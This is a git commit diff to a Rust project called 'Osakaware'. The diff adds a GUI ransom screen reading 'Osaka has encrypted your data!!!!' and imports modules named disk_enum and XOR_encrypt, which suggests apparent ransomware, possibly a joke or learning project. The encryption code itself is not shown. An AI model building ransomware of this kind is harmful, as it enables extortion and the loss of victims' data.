161f96ea297bd672470e1fc6ad42488c4d409f0b
Ramilatif <latiframi18@gmail.com>
2024-04-18 00:50:43 +0200

    the interface in production

--- src/main.rs
+++ src/main.rs
@@ -6,9 +6,10 @@ use disk_enum::disk_enum;
 use XOR_encrypt::XOR_encrypt;
 use window_interact::window_interact;
 use fltk::image::{PngImage};
-use fltk::{prelude::*, *};
-use fltk::{app, enums::FrameType, frame::Frame, image::SvgImage, prelude::*, window::Window,text::{TextBuffer, TextDisplay}};
+use fltk::{prelude::*, *,app, enums::{FrameType,Color}, frame::Frame, image::SvgImage, prelude::*, window::Window,text::{TextBuffer, TextDisplay}};
 use fltk::window;
+use fltk::{button::Button, enums, prelude::*};
+use fltk::app::set_font_size;
 
 
 fn main() {
@@ -17,13 +18,8 @@ fn main() {
             let icon_image = PngImage::load("..\\extra\\img\\icon.png").unwrap();
             let mut image = PngImage::load("..\\extra\\img\\background.png").unwrap();
             let (width, height) = (image.w(), image.h());
-            let mut text_display = TextDisplay::new(50, 50, 300, 200, "");
-             let mut buf = text::TextBuffer::default();
-
             let mut wind = window::Window::new(100, 100, width, height, "Osakaware");
            
-            
-           // wind.set_resizable(false);
            
 
             wind.set_icon(Some(icon_image));
@@ -33,14 +29,19 @@ fn main() {
     frame.set_frame(FrameType::EngravedBox);
   
     frame.draw(move |f| {
-        
-        
         image.draw(f.x(), f.y(), f.w(), f.h());
-    });
-   
+        draw::set_draw_color(Color::from_u32(0xFFFFFF));
+        draw::draw_text("Get it together", f.x() + 350, f.y() + 30);
+        
+       
+        draw::draw_text("Osaka has encrypted your data!!!! If you want to decipher them, give him Chiyo's quilts!!!", f.x() + 50, f.y() + 350);
+    }); 
+    
     wind.flush();
     wind.end();
     wind.show();
+
+   
 
     app.run().unwrap();
         
